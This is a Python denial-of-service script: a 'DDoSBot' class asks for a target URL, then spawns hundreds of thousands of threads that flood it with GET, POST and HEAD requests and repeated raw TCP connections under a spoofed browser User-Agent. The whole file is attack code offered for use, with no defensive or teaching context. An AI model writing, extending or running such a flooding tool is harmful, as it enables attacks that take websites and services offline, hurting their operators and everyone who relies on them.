import requests
import threading
import socket

class DDoSBot:
    def __init__(self, url):
        self.url = url
        self.is_active = True
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }

    def attack(self):
        while self.is_active:
            try:
                requests.get(self.url, headers=self.headers, timeout=0.001)
                requests.post(self.url, headers=self.headers, timeout=0.001)
                requests.head(self.url, headers=self.headers, timeout=0.001)
            except requests.exceptions.RequestException:
                pass

    def socket_attack(self):
        while self.is_active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.url.split('/')[2], 80))
                s.send(b'GET / HTTP/1.1\r\nHost: ' + self.url.split('/')[2].encode() + b'\r\n\r\n')
                s.close()
            except socket.error:
                pass

    def start_attack(self):
        threads = []
        for _ in range(500000):
            thread = threading.Thread(target=self.attack)
            thread.start()
            threads.append(thread)

        for _ in range(500000):
            thread = threading.Thread(target=self.socket_attack)
            thread.start()
            threads.append(thread)

def main():
    url = input("Enter the target URL: ")
    bot = DDoSBot(url)
    bot.start_attack()

if __name__ == "__main__":
    main()
